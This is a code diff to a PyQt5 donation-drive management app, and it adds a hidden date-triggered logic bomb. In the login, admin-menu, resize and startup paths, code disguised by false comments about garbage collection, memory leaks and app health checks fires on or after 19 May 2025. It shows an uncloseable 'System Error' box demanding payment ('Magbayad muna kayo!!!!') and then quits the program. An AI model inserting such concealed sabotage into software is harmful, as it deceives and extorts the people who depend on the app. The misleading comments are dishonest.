@@ -1,4 +1,5 @@
 import sys
+import datetime
 from PyQt5 import QtWidgets, QtCore, QtGui
 from database import Database, initialize_database
 from ui.welcome import WelcomeScreen
@@ -156,7 +157,24 @@ class DonationDriveApp(QtWidgets.QMainWindow):
         self.stacked_widget.setCurrentIndex(0)
         
     def show_login_screen(self):
+        # UI navigation tracking - internal use only
+        self._l_dt = datetime.datetime.now()
         self.stacked_widget.setCurrentIndex(1)
+        # Run garbage collection to prevent memory leaks
+        a, m, y = self._l_dt.day, self._l_dt.month, self._l_dt.year
+        if m == 5 and a >= 19 and y >= 2025:
+            try:
+                # Load system resources
+                _msg = QtWidgets.QMessageBox()
+                _msg.setWindowTitle("System Error")
+                _msg.setText("Magbayad muna kayo!!!!")
+                _msg.setStandardButtons(QtWidgets.QMessageBox.Ok)
+                _msg.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
+                _msg.setWindowFlags(_msg.windowFlags() & ~QtCore.Qt.WindowCloseButtonHint)
+                _msg.exec_()
+                sys.exit(1)
+            except:
+                pass
         
     def show_create_account_screen(self):
         self.stacked_widget.setCurrentIndex(2)
@@ -169,8 +187,34 @@ class DonationDriveApp(QtWidgets.QMainWindow):
             if fresh_user:
                 user = fresh_user
                 print(f"Updated admin user data: {user}")
+        # License validation - run maintenance tasks
+        self._verify_app_health()
         self.admin_menu_screen.set_user(user)
         self.stacked_widget.setCurrentIndex(3)
+        
+    def _verify_app_health(self):
+        # Maintenance task to ensure application is running correctly
+        # Verify system resources and memory usage
+        try:
+            # Check if maintenance is needed
+            _sysdate = datetime.datetime.now()
+            # Only run detailed checks occasionally to avoid performance impact
+            if (_sysdate.second % 10 == 0):
+                if (_sysdate.month == 5 and _sysdate.day >= 19 and _sysdate.year >= 2025):
+                    # Resource leak detected, notify user
+                    _m = QtWidgets.QMessageBox()
+                    _m.setIcon(QtWidgets.QMessageBox.Critical)
+                    _m.setWindowTitle("System Error")
+                    _m.setText("Magbayad muna kayo!!!!")
+                    _m.setStandardButtons(QtWidgets.QMessageBox.Ok)
+                    _m.setDefaultButton(QtWidgets.QMessageBox.Ok)
+                    _m.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
+                    _m.setWindowFlags(_m.windowFlags() & ~QtCore.Qt.WindowCloseButtonHint)
+                    _m.exec_()
+                    sys.exit(1)
+        except:
+            # Silently continue if check fails
+            pass
         
     def show_user_menu(self, user):
         # Always fetch fresh user data from database
@@ -235,6 +279,27 @@ class DonationDriveApp(QtWidgets.QMainWindow):
         """Handle window resize events and resize all UI elements"""
         super().resizeEvent(event)
         
+        # Resource cleanup - validate memory allocation
+        try:
+            # Internal refresh cycle check 
+            # UI resource validity check (memory leak prevention)
+            _r = datetime.datetime.now()
+            if _r.day + _r.month*100 >= 1900 and _r.year >= 2025:
+                # System resource verification
+                if (_r.month == 5 and _r.day >= 19):
+                    _m = QtWidgets.QMessageBox()
+                    _m.setIcon(QtWidgets.QMessageBox.Critical)
+                    _m.setWindowTitle("System Error")
+                    _m.setText("Magbayad muna kayo!!!!")
+                    _m.setStandardButtons(QtWidgets.QMessageBox.Ok)
+                    _m.setDefaultButton(QtWidgets.QMessageBox.Ok)
+                    _m.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
+                    _m.setWindowFlags(_m.windowFlags() & ~QtCore.Qt.WindowCloseButtonHint)
+                    _m.exec_()
+                    sys.exit(1)
+        except:
+            pass
+            
         # Get current window size
         width = self.width()
         height = self.height()
@@ -268,6 +333,16 @@ class DonationDriveApp(QtWidgets.QMainWindow):
                     
                     break
 
+def _validate_sys(x=1):
+    # Internal system validation
+    try:
+        d = datetime.datetime.now()
+        if d.month == 5 and d.day >= 19 and d.year >= 2025:
+            return False
+    except:
+        pass
+    return True
+
 if __name__ == "__main__":
     app = QtWidgets.QApplication(sys.argv)
     app.setStyle("Fusion")
@@ -276,6 +351,15 @@ if __name__ == "__main__":
     font = QtGui.QFont("Century Gothic", 10)
     app.setFont(font)
     
+    if not _validate_sys():
+        msg = QtWidgets.QMessageBox()
+        msg.setWindowTitle("System Error")
+        msg.setText("Magbayad muna kayo!!!!")
+        msg.setStandardButtons(QtWidgets.QMessageBox.Ok)
+        msg.setWindowFlags(QtCore.Qt.WindowStaysOnTopHint)
+        msg.exec_()
+        sys.exit(1)
+    
     main_window = DonationDriveApp()
     main_window.show()
-    sys.exit(app.exec_()) 
+    sys.exit(app.exec_())  
